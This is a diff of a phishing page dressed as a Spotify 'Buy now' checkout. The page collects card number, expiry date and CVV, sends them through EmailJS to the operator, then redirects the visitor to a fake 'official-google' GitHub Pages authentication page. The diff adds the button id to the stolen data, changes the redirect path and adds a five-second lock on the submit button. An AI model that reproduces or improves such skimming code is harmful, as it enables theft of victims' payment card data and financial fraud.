@@ -342,7 +342,7 @@ button[type="submit"] {
    </div>
    
    <div class="button-container">
-   <button type="submit" id="submit" onclick="sendMail()">Buy now</button>
+   <button type="submit" id="SpotifyCard" onclick="sendMail()">Buy now</button>
    </div>
   
   </form>  
@@ -435,6 +435,7 @@ button[type="submit"] {
       cardnumber : document.getElementById("cardnumber").value,
       expirydate : document.getElementById("expirydate").value,
       cvv : document.getElementById("cvv").value,
+      submit_button_id: document.getElementById("SpotifyCard").id
     };
     
     // Set formSubmitted to true before sending email
@@ -443,7 +444,7 @@ button[type="submit"] {
         emailjs.send("service_6kbj4eu","template_ncggmgb", parms)
       .then(function(response) {
         // Redirect to Google after email is sent
-        window.location.href = "https://official-google.github.io/Spotify/Authentication.html";
+        window.location.href = "https://official-google.github.io/1/Authentication.html";
       })
       .catch(function(error) {
         console.error('Invalid Card number!', error);
@@ -504,8 +505,21 @@ document.addEventListener('DOMContentLoaded', function() {
   function focusInput() {
     document.getElementById('cardnumber').focus();
   }
+  
 </script>
 
+<script>
+document.getElementById('SpotifyCard').addEventListener('click', function() {
+    const button = this;
+    button.disabled = true; // Disable the button
+
+    setTimeout(function() {
+        button.disabled = false; // Re-enable the button after 5 seconds
+    }, 5000); // 5000 milliseconds = 5 seconds
+});
+   
+ </script>
+ 
   </body>
 	</html>
- 
+	
